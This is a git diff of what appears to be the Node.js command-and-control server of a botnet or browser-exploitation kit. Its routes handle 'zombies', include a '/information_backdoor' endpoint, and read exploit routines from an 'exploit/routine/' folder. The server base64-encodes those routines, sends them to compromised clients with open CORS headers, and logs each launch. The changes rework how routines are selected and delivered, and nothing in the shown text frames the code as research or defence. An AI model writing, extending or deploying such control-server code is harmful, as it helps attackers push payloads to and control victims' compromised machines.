@@ -21,7 +21,7 @@ var app = require('express')(),
         // {'name':'Lunch exec', 'number':1,'done':0,'routine':'replace_exe.neela'}
       ]
     };
-    var routine_test = {'action':[{'number':1,'done':0,'routine':'facebook'}]};
+    //var routine_test = {'action':[{'number':1,'done':0,'routine':'facebook'}]};
 
 var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
 
@@ -166,7 +166,7 @@ app.post('/information_backdoor', function(req, res){
 
 app.get('/next/:step/:name_routine', function(req, res){
     var nb_step = req.params.step;
-    var data_action = routine_test.action;
+    var data_action = action.action;
     for(var element in data_action)
     {
         var routine_name = data_action[element].routine;
@@ -199,7 +199,7 @@ app.get('/next/:step/:name_routine', function(req, res){
     }
 });
 
-app.get('/routine_test/:zombie', function(req, res){
+app.get('/routine_zombie/:zombie', function(req, res){
   if(start_loader == 1){
   var zombie = req.params.zombie;
   // console.log('Zombie routine : ' + zombie);
@@ -215,7 +215,7 @@ app.get('/routine_test/:zombie', function(req, res){
   }
   else if(routine_wait[zombie] == 5){
     if(action.action.length > 0){
-        var data_action = routine_test.action;
+        var data_action = action.action;
         for(var element in data_action)
         {
           var number = data_action[element].number;
@@ -247,54 +247,6 @@ app.get('/routine_test/:zombie', function(req, res){
 }
 });
 
-app.get('/routine_zombie/:zombie', function(req, res){
-  if(start_loader == 1){
-  var zombie = req.params.zombie;
-  // console.log('Zombie routine : ' + zombie);
-  res.setHeader('Access-Control-Allow-Origin', '*');
-    if(routine_wait[zombie] == undefined){
-
-      routine_wait[zombie] = 2;
-      disconect_z(zombie);
-      res.end('');
-    }
-  else if(routine_wait[zombie] > 20){
-    io.emit('delete_zombie',{'name':zombie,'error':1});
-    res.end('ok');
-  }
-  else if(routine_wait[zombie] == 5){
-    if(action.action.length > 0){
-        var data_action = action.action;
-        for(var element in data_action)
-        {
-          var name = data_action[element].name;
-          var number = data_action[element].number;
-          var executed = data_action[element].done;
-          var status = Base64.encode(name);
-          io.emit('new_log', {'zombie':zombie,'name':'routine','information':status});
-          if(executed != '1' && number != '0'){
-            fs.readFile(__dirname + '/exploit/routine/'+data_action[element].routine, function (err, data) {
-            if (err) throw err;
-            res.setHeader('Access-Control-Allow-Origin', '*');
-            var payload = data.toString('base64');
-            var status = name+' lunched';
-            status = Base64.encode(status);
-            io.emit('new_log', {'zombie':zombie,'name':'routine','information':status});
-            res.end(payload);
-            console.log('|__['+colors.blue('+')+'] routine send');
-            io.emit('delete_zombie',{'name':zombie});
-            });
-          }
-          if(number == '0' && executed != '1'){
-              executed = '1';
-          }
-        }
-        routine_wait[zombie] += 1;
-    }
-  }
-}
-});
-
 function disconect_z(zombie){
   setTimeout(function(){
     if(disconnect[zombie] == undefined){
@@ -311,11 +263,7 @@ function disconect_z(zombie){
 io.sockets.on('connection', function (socket) {
   socket.on('select_routine', function(routine){
     var value = routine.name;
-    action = {
-      "action":[
-        {'name': routine.name, 'number':1,'done':0,'routine':'soon'}
-      ]
-    };
+    action = {'action':[{'number':1,'done':0,'routine':value}]};
     console.log('|_['+colors.green('+')+'] Routine selected : '+action.action[0].name);
     socket.emit('return_routine', {'name':action.action});
   })
